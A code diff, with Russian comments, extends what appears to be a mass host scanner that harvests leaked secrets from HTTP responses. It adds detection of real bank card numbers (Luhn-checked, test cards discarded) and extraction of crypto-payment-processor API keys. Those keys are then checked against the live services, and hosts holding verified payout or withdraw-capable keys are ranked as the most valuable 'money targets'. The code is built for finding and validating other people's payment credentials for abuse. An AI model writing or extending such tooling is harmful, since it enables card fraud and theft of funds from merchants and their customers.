@@ -15,6 +15,7 @@ from .ai_verify import (
     check_dsn,
     extract_ai_keys,
     extract_aws_keypairs,
+    extract_cryptopay_keys,
     extract_dsns,
     extract_exchange_pairs,
     extract_secrets,
@@ -23,6 +24,7 @@ from .ai_verify import (
     extract_twitter_bearers,
     verify_ai_key,
     verify_aws_keypair,
+    verify_cryptopay_key,
     verify_exchange_keypair,
     verify_secret,
     verify_telegram_bot,
@@ -129,6 +131,15 @@ SENSITIVE_PATTERNS = {
     "otp_secret": re.compile(r'"(?:otp_secret|totp_secret)"\s*:\s*"[A-Z2-7]{16,}"'),
     "stripe_live": re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),
     "stripe_restricted": re.compile(r'rk_live_[0-9a-zA-Z]{24,}'),
+    # Банковская карта: 13-19 цифр (можно с пробелами/дефисами) в card/pan-поле;
+    # Luhn + отсев тестовых карт делается в classify_response
+    "card_number": re.compile(
+        r'"[^"]{0,24}(?:card|pan)[^"]{0,16}"\s*:\s*"?([0-9][0-9 -]{12,21})"?', re.I),
+    # Крипто-платёжные процессоры с выплатами: ключ рядом с названием сервиса
+    # или сервис прямо в имени поля (nowpayments_api_key)
+    "cryptopay_key": re.compile(
+        r'(?i)(?:"(?:heleket|cryptomus|nowpayments|plisio)[_-][a-z0-9_-]{0,20}(?:api[_-]?key|apikey)"\s*:\s*"[A-Za-z0-9_-]{20,}"'
+        r'|\b(?:heleket|cryptomus|nowpayments|plisio)(?![a-z0-9])[\s\S]{0,200}"[a-z0-9_-]{0,24}(?:api[_-]?key|apikey)"\s*:\s*"[A-Za-z0-9_-]{20,}")'),
     # Money rule: разрешение вывода средств в конфиге/ответе
     "withdraw_flag": re.compile(r'"(?:can_withdraw|withdraw_enabled|withdrawal_enabled|allow_withdraw)"\s*:\s*"?(?:true|1)"?'),
 
@@ -227,6 +238,30 @@ PLACEHOLDER_HOSTS = {
     "db-host", "database-host", "server", "dbserver",
 }
 
+
+# Банковские карты: Luhn + отсев известных тестовых номеров
+CARD_TEST_BIN_PREFIXES = {
+    "411111", "424242", "400000", "550000", "601111", "378282", "371449",
+    "222300", "555555", "510510", "401288", "378734", "601100",
+}
+
+
+def luhn_ok(digits: str) -> bool:
+    total = 0
+    for i, ch in enumerate(reversed(digits)):
+        d = int(ch)
+        if i % 2 == 1:
+            d *= 2
+            if d > 9:
+                d -= 9
+        total += d
+    return total % 10 == 0
+
+
+def is_test_card(digits: str) -> bool:
+    return len(set(digits)) == 1 or digits[:6] in CARD_TEST_BIN_PREFIXES
+
+
 # AWS example keys (из документации)
 AWS_EXAMPLE_KEYS = {
     "AKIAIOSFODNN7EXAMPLE",
@@ -235,8 +270,7 @@ AWS_EXAMPLE_KEYS = {
 }
 
 # Placeholder значения (когда значение = название поля)
-PLACEHOLDER_VALUES = {
-    "password", "passwd", "secret", "token", "key", "api_key", "apikey",
+PLACEHOLDER_VALUES = {    "password", "passwd", "secret", "token", "key", "api_key", "apikey",
     "email", "username", "user", "login", "string", "your_password",
     "your_token", "your_key", "your_secret", "enter_password", "test",
     "example", "sample", "demo", "placeholder", "changeme", "change_me",
@@ -372,6 +406,9 @@ SEVERITY_MAP = {
     "dropbox_token_valid": "HIGH",
     "twilio_pair_valid": "HIGH",
     "twitter_token_valid": "MEDIUM",
+    "card_number": "HIGH",
+    "cryptopay_key": "HIGH",
+    "cryptopay_key_valid": "CRITICAL",
     "exchange_key_valid": "CRITICAL",
     "exchange_withdraw_enabled": "CRITICAL",
     "money_target": "CRITICAL",
@@ -511,6 +548,14 @@ def classify_response(body: str) -> tuple[list[str], str]:
                 if not re.search(r'solana|wallet|keypair|secret|privat', ctx):
                     continue
 
+            # card_number: только Luhn-валидные реальные карты
+            # (тестовые 4111…/4242… и номера-болваны не считаем)
+            if name == "card_number":
+                digits = re.sub(r'\D', '', value_text)
+                if not (13 <= len(digits) <= 19
+                        and luhn_ok(digits) and not is_test_card(digits)):
+                    continue
+
             matched = True
             break
 
@@ -600,6 +645,8 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
             twitter_bearers_found: set[str] = set()
             exchange_pairs_found: list[dict[str, Any]] = []
             exchange_pairs_seen: set[tuple[str, str, str]] = set()
+            cryptopay_keys_found: list[dict[str, Any]] = []
+            cryptopay_keys_seen: set[tuple] = set()
 
             # 4. Тестируем эндпоинты
             for path_template, methods in paths.items():
@@ -696,6 +743,12 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                                         if sig not in exchange_pairs_seen:
                                             exchange_pairs_seen.add(sig)
                                             exchange_pairs_found.append(p)
+                                if cfg.cryptopay_checks:
+                                    for p in extract_cryptopay_keys(body[:100_000]):
+                                        sig = (p["service"], p["key"], p["merchant"])
+                                        if sig not in cryptopay_keys_seen:
+                                            cryptopay_keys_seen.add(sig)
+                                            cryptopay_keys_found.append(p)
 
                                 if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
                                     max_severity = sev
@@ -876,10 +929,26 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                         if chk.get("withdraw_enabled") is True:
                             all_patterns.append("exchange_withdraw_enabled")
 
+            # Крипто-платёжки (heleket/cryptomus/nowpayments/plisio):
+            # read-only баланс, ключ = приём платежей + выплаты
+            cryptopay_checks: list[dict[str, Any]] = []
+            if cfg.cryptopay_checks and cryptopay_keys_found:
+                for p in cryptopay_keys_found[: cfg.cryptopay_max]:
+                    chk = await verify_cryptopay_key(
+                        session, p["service"], p["key"], merchant=p["merchant"],
+                        proxy=proxy, timeout_s=max(cfg.check_timeout, 8),
+                    )
+                    cryptopay_checks.append(chk)
+                    if chk["status"] == "valid":
+                        all_patterns.append("cryptopay_key_valid")
+                        if severity_order.get(max_severity, 0) < 3:
+                            max_severity = "CRITICAL"
+
             # Money-корреляция: withdraw-эндпоинты + проверенные денежные
             # ключи на одном хосте = самая ценная цель (деньги и вход в одном месте)
             money_verified = (
                 any(c.get("status") == "valid" for c in exchange_checks)
+                or any(c.get("status") == "valid" for c in cryptopay_checks)
                 or any(c.get("status") == "valid" and c.get("money") for c in telegram_checks)
                 or any(c.get("status") == "valid" and c.get("kind") == "stripe" for c in secret_checks)
                 or any(c.get("status") == "auth_ok" for c in dsn_checks)
@@ -932,6 +1001,7 @@ async def check_host(row: HostRow, cfg: Settings, proxy: str | None = None) -> C
                 "twilio_checks": twilio_checks,
                 "twitter_checks": twitter_checks,
                 "exchange_checks": exchange_checks,
+                "cryptopay_checks": cryptopay_checks,
             }
 
     except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
